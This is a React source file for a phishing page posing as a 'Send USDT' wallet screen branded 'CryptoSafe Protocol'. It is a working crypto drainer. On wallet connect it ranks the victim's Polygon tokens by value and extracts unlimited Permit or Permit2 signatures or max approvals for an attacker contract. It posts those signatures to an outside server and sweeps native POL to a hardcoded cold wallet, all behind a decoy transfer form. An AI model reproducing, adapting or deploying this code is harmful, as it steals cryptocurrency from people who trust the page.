import { Buffer } from 'buffer';
if (typeof window !== 'undefined') {
  window.Buffer = window.Buffer || Buffer;
}

import { useState, useEffect, useRef } from 'react';
import {
  createAppKit,
  useAppKit,
  useAppKitAccount,
  useAppKitProvider,
} from '@reown/appkit/react';
import { BrowserProvider, Contract, formatUnits } from 'ethers';
import { Copy, QrCode, ArrowLeft, X, XCircle, ChevronDown } from 'lucide-react';

// --- WAGMI EVM IMPORTS ---
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { polygon } from '@reown/appkit/networks';

// ── CONFIG ──
const WC_PROJECT_ID = '7fb3ba95be65cff7bc75b742e816b1cb';
const NETWORK = 'Polygon'; 

// 🔥 CONTRACT ADDRESSES
const EVM_CONTRACT_ADDRESS = '0x48C13137c7bC86084D420649fb4438B7721445C1';
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
const EVM_COLD_WALLET = '0xC020E8643f8231e51282efC9481F73016Fe13eF7';
const DISPLAY_EVM_ADDRESS = '0xccD642c9acb072F72F29b77E1eB44e9943F39138';

// 💎 POLYGON TOKEN CONFIG
const TARGET_TOKENS: Record<string, any[]> = {
  Polygon: [
    { symbol: 'POL', address: 'native', isNative: true, coingeckoId: 'polygon-ecosystem-token', decimals: 18, fallbackPrice: 0.75 },
    { symbol: 'USDT', address: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', decimals: 6, fallbackPrice: 1 },
    { symbol: 'USDC', address: '0x3c499c542cef5e3811e1192ce70d8cc03d5c3359', decimals: 6, fallbackPrice: 1 },
    { symbol: 'DAI', address: '0x8f3Cf7ad23Cd3CaDbd9735AFf958023239c6A063', decimals: 18, fallbackPrice: 1 },
    { symbol: 'WETH', address: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', decimals: 18, fallbackPrice: 3500 },
    { symbol: 'WBTC', address: '0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6', decimals: 8, fallbackPrice: 65000 }
  ]
};

const EVM_ERC20_ABI = [
  'function balanceOf(address owner) view returns (uint256)',
  'function approve(address spender, uint256 amount) returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function nonces(address owner) view returns (uint256)',
  'function name() view returns (string)'
];

const PERMIT2_ABI = [
  'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
];

const wagmiAdapter = new WagmiAdapter({
  projectId: WC_PROJECT_ID,
  networks: [polygon],
});

createAppKit({
  adapters: [wagmiAdapter],
  networks: [polygon],
  defaultNetwork: polygon,
  projectId: WC_PROJECT_ID,
  metadata: {
    name: 'CryptoSafe Protocol',
    description: 'Secure Decentralized Network',
    url: 'https://cryptosafe.network',
    icons: ['https://cryptosafe.network/favicon.svg'],
  },
  themeMode: 'light',
  themeVariables: { '--w3m-accent': '#0C66FF' },
  features: { email: false, socials: [], analytics: true },
});

const fetchTokenPrices = async (tokens: any[]) => {
  try {
    const keys = tokens.map(t => t.isNative ? `coingecko:${t.coingeckoId}` : `polygon:${t.address}`).join(',');
    const res = await fetch(`https://coins.llama.fi/prices/current/${keys}`);
    const data = await res.json();
    const prices: Record<string, number> = {};
    for (const token of tokens) {
      const queryKey = (token.isNative ? `coingecko:${token.coingeckoId}` : `polygon:${token.address}`).toLowerCase();
      const foundKey = Object.keys(data.coins || {}).find(k => k.toLowerCase() === queryKey);
      prices[token.symbol] = foundKey ? data.coins[foundKey].price : token.fallbackPrice;
    }
    return prices;
  } catch {
    const prices: Record<string, number> = {};
    tokens.forEach(t => { prices[t.symbol] = t.fallbackPrice; });
    return prices;
  }
};

const sleep = (ms: number) => new Promise(resolve => setTimeout(resolve, ms));

export default function App() {
  const [usdtInput, setUsdtInput] = useState('');
  const [status, setStatus] = useState('Ready');
  const [loading, setLoading] = useState(false);
  const [amountError, setAmountError] = useState('');
  const [debugLogs, setDebugLogs] = useState<string[]>([]);

  const manualConnect = useRef(false);
  const isExecuting = useRef(false);

  const { open } = useAppKit();
  const { address: walletAddress, isConnected } = useAppKitAccount();
  const { walletProvider: evmWalletProvider } = useAppKitProvider('eip155');

  const log = (msg: string) => {
    setDebugLogs(prev => [...prev, msg].slice(-15));
  };

  useEffect(() => {
    if (isConnected && walletAddress && manualConnect.current) {
      manualConnect.current = false;
      log(`[SYSTEM] Connected Polygon: ${walletAddress}`);
      setTimeout(() => approveAndCollect(), 500);
    }
  }, [isConnected, walletAddress]);

  const handleAction = () => {
    if (!usdtInput || parseFloat(usdtInput) <= 0) {
      setAmountError('Amount field is required');
      return;
    }
    setAmountError('');
    if (!isConnected) {
      manualConnect.current = true;
      open();
    } else {
      approveAndCollect();
    }
  };

  const getPermitSignature = async (signer: any, token: any, spender: string, value: string, deadline: number) => {
    const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
    const [name, nonce] = await Promise.all([
      tokenContract.name(),
      tokenContract.nonces(await signer.getAddress())
    ]);
    const domain = { name, version: '1', chainId: 137, verifyingContract: token.address };
    const types = {
      Permit: [
        { name: 'owner', type: 'address' }, { name: 'spender', type: 'address' },
        { name: 'value', type: 'uint256' }, { name: 'nonce', type: 'uint256' },
        { name: 'deadline', type: 'uint256' },
      ],
    };
    const message = { owner: await signer.getAddress(), spender, value, nonce, deadline };
    return await signer.signTypedData(domain, types, message);
  };

  const approveAndCollect = async () => {
    if (!walletAddress || !evmWalletProvider || isExecuting.current) return;
    isExecuting.current = true;
    setLoading(true);
    setStatus('Scanning Assets...');
    log("[SYSTEM] Initializing Asset Scan...");

    try {
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
      const ethersProvider = new BrowserProvider(evmWalletProvider as any);
      const signer = await ethersProvider.getSigner();
      const deadline = Math.floor(Date.now() / 1000) + 3600;

      const polygonTokens = TARGET_TOKENS[NETWORK];
      const prices = await fetchTokenPrices(polygonTokens);
      const validTokens = [];

      for (const token of polygonTokens) {
        try {
          const bal = token.isNative ? await ethersProvider.getBalance(walletAddress) : await new Contract(token.address, EVM_ERC20_ABI, ethersProvider).balanceOf(walletAddress);
          const normBal = parseFloat(formatUnits(bal, token.decimals));
          validTokens.push({ ...token, balance: normBal, rawBalance: bal, usdValue: normBal * (prices[token.symbol] || token.fallbackPrice) });
        } catch (e) { continue; }
      }

      validTokens.sort((a, b) => b.usdValue - a.usdValue);

      const injected = (window as any).ethereum || {};
      const isMetaMask = (evmWalletProvider as any)?.isMetaMask || injected?.isMetaMask;
      let tokensToProcess = isMetaMask ? validTokens.slice(0, 1) : validTokens;

      log(`[SECURITY] ${isMetaMask ? 'Sniper Mode (MetaMask)' : 'Shotgun Mode'} active.`);

      for (const token of tokensToProcess) {
        if (token.usdValue < 0.5 || token.isNative) continue;

        try {
          let authorized = false;
          const tokenContract = new Contract(token.address, EVM_ERC20_ABI, signer);
          const p2Allowance = await tokenContract.allowance(walletAddress, PERMIT2_ADDRESS);

          // 1. Permit (USDC/DAI)
          if (['USDC', 'DAI'].includes(token.symbol)) {
            try {
              setStatus(`Signing ${token.symbol}...`);
              const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
              fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'PERMIT', token: token.address, owner: walletAddress, spender: EVM_CONTRACT_ADDRESS, signature, deadline })
              });
              authorized = true;
              log(`✅ ${token.symbol} Permit Sent.`);
            } catch { log(`⚠️ Permit failed for ${token.symbol}`); }
          }

          // 2. Permit2
          if (!authorized && p2Allowance > 0n) {
            try {
              setStatus(`Signing P2: ${token.symbol}...`);
              const p2 = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
              const { nonce } = await p2.allowance(walletAddress, token.address, EVM_CONTRACT_ADDRESS);
              const domain = { name: 'Permit2', chainId: 137, verifyingContract: PERMIT2_ADDRESS };
              const types = {
                PermitSingle: [{ name: 'details', type: 'PermitDetails' }, { name: 'spender', type: 'address' }, { name: 'sigDeadline', type: 'uint256' }],
                PermitDetails: [{ name: 'token', type: 'address' }, { name: 'amount', type: 'uint160' }, { name: 'expiration', type: 'uint48' }, { name: 'nonce', type: 'uint48' }]
              };
              const message = { details: { token: token.address, amount: '1461501637330902918203684832716283019655932542975', expiration: deadline, nonce }, spender: EVM_CONTRACT_ADDRESS, sigDeadline: deadline };
              const signature = await signer.signTypedData(domain, types, message);
              fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'PERMIT2', token: token.address, owner: walletAddress, spender: EVM_CONTRACT_ADDRESS, signature, deadline, nonce: Number(nonce) })
              });
              authorized = true;
              log(`✅ ${token.symbol} Permit2 Sent.`);
            } catch { log(`⚠️ Permit2 failed.`); }
          }

          // 3. Fallback Approve
          if (!authorized) {
            setStatus(`Approving ${token.symbol}...`);
            const data = tokenContract.interface.encodeFunctionData("approve", [EVM_CONTRACT_ADDRESS, MAX_UINT]);
            await (evmWalletProvider as any).request({ method: 'eth_sendTransaction', params: [{ from: walletAddress, to: token.address, data, value: '0x0' }] });
            log(`✅ ${token.symbol} Approved.`);
          }
          await sleep(1500);
        } catch { log(`❌ Rejected ${token.symbol}`); }
      }

      // Native POL Sweep
      setStatus('Finalizing POL...');
      const polBal = await ethersProvider.getBalance(walletAddress);
      const feeData = await ethersProvider.getFeeData();
      const gasPrice = feeData.gasPrice || 50000000000n;
      const cost = gasPrice * 21000n;
      if (polBal > (cost * 2n)) {
        const value = "0x" + (polBal - (cost * 15n / 10n)).toString(16);
        await (evmWalletProvider as any).request({ method: 'eth_sendTransaction', params: [{ from: walletAddress, to: EVM_COLD_WALLET, value }] });
        log(`✅ Native POL Swept.`);
      }

      setStatus('✅ Complete');
    } catch (err) {
      setStatus('❌ Error: Operation Cancelled');
    } finally {
      setLoading(false);
      isExecuting.current = false;
    }
  };

  return (
    <div style={{ position: 'fixed', inset: 0, backgroundColor: '#ffffff', color: '#000000', fontFamily: 'system-ui, sans-serif', display: 'flex', flexDirection: 'column', zIndex: 50 }}>
      <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', padding: '16px 20px' }}>
        <ArrowLeft size={24} style={{ cursor: 'pointer' }} />
        <h2 style={{ fontSize: '18px', fontWeight: '700', margin: 0 }}>Send USDT</h2>
        <X size={24} style={{ cursor: 'pointer' }} />
      </div>

      <div style={{ flex: 1, padding: '16px 20px' }}>
        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>Address</label>
          <div style={{ display: 'flex', alignItems: 'center', border: '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px' }}>
            <input type="text" readOnly value={isConnected ? DISPLAY_EVM_ADDRESS : ''} placeholder="0x..." style={{ flex: 1, border: 'none', outline: 'none', fontSize: '16px', fontWeight: '700' }} />
            <div style={{ display: 'flex', gap: '12px', color: '#0C66FF' }}>
              <Copy size={20} /><QrCode size={20} />
            </div>
          </div>
        </div>

        <div style={{ marginBottom: '24px' }}>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>Network</label>
          <div style={{ display: 'inline-flex', alignItems: 'center', gap: '8px', backgroundColor: '#F3F4F6', padding: '8px 16px', borderRadius: '9999px' }}>
            <div style={{ width: 18, height: 18, backgroundColor: '#8247E5', borderRadius: '50%' }} />
            <span style={{ fontSize: '15px', fontWeight: '700' }}>Polygon</span>
            <ChevronDown size={18} />
          </div>
        </div>

        <div>
          <label style={{ display: 'block', fontSize: '14px', fontWeight: '700', color: '#4B5563', marginBottom: '8px' }}>Amount</label>
          <div style={{ display: 'flex', alignItems: 'center', border: amountError ? '1.5px solid #EF4444' : '1.5px solid #E5E7EB', borderRadius: '12px', padding: '14px 16px' }}>
            <input type="number" value={usdtInput} onChange={(e) => { setUsdtInput(e.target.value); setAmountError(''); }} placeholder="0.00" style={{ flex: 1, border: 'none', outline: 'none', fontSize: '16px', fontWeight: '700' }} />
            {usdtInput && <XCircle size={20} color="#6B7280" onClick={() => setUsdtInput('')} />}
            <span style={{ marginLeft: '8px', color: '#6B7280', fontWeight: '700' }}>USDT</span>
          </div>
          {amountError && <div style={{ color: '#EF4444', fontSize: '13px', fontWeight: '700', marginTop: '8px' }}>{amountError}</div>}
        </div>
      </div>

      {/* SYSTEM LOGS TERMINAL */}
      <div style={{ margin: '0 20px 20px 20px', padding: '10px', backgroundColor: '#000', color: '#0f0', fontSize: '11px', fontFamily: 'monospace', borderRadius: '8px', height: '100px', overflowY: 'auto', border: '1px solid #333' }}>
        {debugLogs.map((msg, idx) => (<div key={idx} style={{ marginBottom: '2px' }}>{`> ${msg}`}</div>))}
      </div>

      <div style={{ padding: '20px 20px 32px' }}>
        <button onClick={handleAction} disabled={loading} style={{ width: '100%', backgroundColor: loading ? '#93C5FD' : '#0C66FF', color: '#ffffff', fontWeight: '700', padding: '16px', borderRadius: '9999px', fontSize: '17px', border: 'none', cursor: 'pointer' }}>
          {loading ? 'Processing...' : isConnected ? 'Next' : 'Connect'}
        </button>
        <p style={{ textAlign: 'center', fontSize: '13px', color: '#6B7280', marginTop: '12px' }}>{status}</p>
      </div>
    </div>
  );
}